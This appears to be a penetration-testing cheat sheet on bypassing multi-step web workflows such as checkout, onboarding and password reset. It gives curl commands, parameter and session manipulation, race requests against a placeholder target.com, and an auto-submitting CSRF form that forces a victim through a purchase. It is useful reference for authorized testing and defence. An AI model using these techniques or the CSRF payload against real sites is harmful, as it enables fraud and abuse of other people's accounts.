# Workflow Bypass

## Summary
Skipping or reordering multi-step workflows to access privileged functionality without completing required steps.

## Common Workflow Targets

- Checkout flows (cart → shipping → payment → confirmation)
- Onboarding / registration (email → profile → payment → dashboard)
- Password reset (email → token → new password → confirmation)
- Account deletion (verify → confirm → delete)
- Multi-step forms (step 1 → step 2 → step 3)

## Direct Navigation

```bash
# Try accessing each step directly
curl https://target.com/checkout/step1
curl https://target.com/checkout/step2
curl https://target.com/checkout/step3
curl https://target.com/checkout/confirm

# If step 3 or confirm loads without completing step 2 → bypass!
```

## Parameter Manipulation

```bash
# Some apps track workflow state with hidden params
POST /checkout/step2
{"step": "2", "completed": "true", "skip_to": "confirm"}

# Try manipulating step numbers
POST /checkout/payment  →  try changing step=3 to step=confirm
POST /onboarding/step1  →  add {"step": "complete"}

# Try force-completing steps
POST /api/workflow/current-state  →  PATCH with {"status": "complete"}
```

## Session-Based State Skipping

```bash
# If workflow state is stored in session, reuse old sessions
# Step 1: Complete workflow legitimately, save session cookie
# Step 2: Start a new workflow, swap in the old session
# Step 3: If state is not re-validated, you skip ahead

curl -X POST https://target.com/onboarding/step1 -c session1.txt
# ... complete all steps in session1 ...
curl -X POST https://target.com/onboarding/step1 -c session2.txt
curl https://target.com/onboarding/dashboard -b session1.txt
```

## Parallel Request Race

```bash
# If steps are validated sequentially, send them in parallel:
curl -X POST https://target.com/checkout/step1 -d "data=step1" &
curl -X POST https://target.com/checkout/step2 -d "data=step2" &
curl -X POST https://target.com/checkout/confirm -d "data=confirm" &
wait

# If the server processes confirm before step two state is set → bypass
```

## HTTP Method Confusion

```bash
# Step validation may only work for GET but not POST (or vice versa)
GET https://target.com/checkout/confirm
# vs
POST https://target.com/checkout/confirm

# One method may bypass state checks
```

## Missing CSRF in Workflow Steps

```bash
# If intermediate steps lack CSRF tokens, attacker can force
# victim through a multi-step action:

<form action="https://target.com/checkout/step1" method="POST" id="f1">
  <input name="product" value="expensive-item">
</form>
<form action="https://target.com/checkout/confirm" method="POST" id="f2">
  <input name="agree" value="true">
</form>
<script>f1.submit(); setTimeout(() => f2.submit(), 1000);</script>
```

